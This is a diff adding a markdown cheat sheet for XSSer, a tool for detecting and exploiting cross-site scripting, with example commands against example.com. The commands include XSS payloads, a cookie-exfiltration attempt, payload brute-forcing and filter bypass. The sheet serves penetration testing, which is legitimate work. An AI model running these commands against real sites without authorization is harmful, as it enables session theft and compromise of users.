@@ -1,0 +1,42 @@
+## 🕸️ XSSer – Cross-Site Scripting Exploitation Tool
+
+**XSSer** is a command-line tool designed to detect and exploit Cross-Site Scripting (XSS) vulnerabilities in web applications.  
+It supports testing for reflected, stored, DOM-based, and blind XSS vulnerabilities using automated payload injection and analysis.
+
+XSSer is useful for initial discovery, but modern applications often require manual validation.
+
+### 🔹 Common XSSer Usage
+
+```bash
+# Basic scan for stored XSS (specific parameter)
+xsser -u "https://www.example.com/profile?id=1" -c comment
+
+# DOM-based XSS scan
+xsser -u "https://www.example.com/page" --dom
+
+# Scan multiple URLs from a file
+xsser -l urls.txt
+
+# Test XSS with cookies
+xsser -u "https://www.example.com/login" --cookie "auth=12345"
+
+# Reflected XSS test with payload
+xsser -u "https://www.example.com/search?q=<script>alert(1)</script>"
+
+# Blind XSS with custom payload
+xsser -u "https://www.example.com/profile" -p name -vPayload "<script>alert(1)</script>"
+
+# Attempt cookie exfiltration via XSS
+xsser -u "https://www.example.com/profile" --cookie "auth=12345" -E
+
+# Brute force XSS payloads
+xsser -u "https://www.example.com/page" --brute
+
+# Custom User-Agent header
+xsser -u "https://www.example.com/page" -H "User-Agent: MyCustomUserAgent"
+
+# Attempt XSS filter bypass
+xsser -u "https://www.example.com/page" --filter-bypass
+
+# Reduce output noise (useful for automation)
+xsser --silent
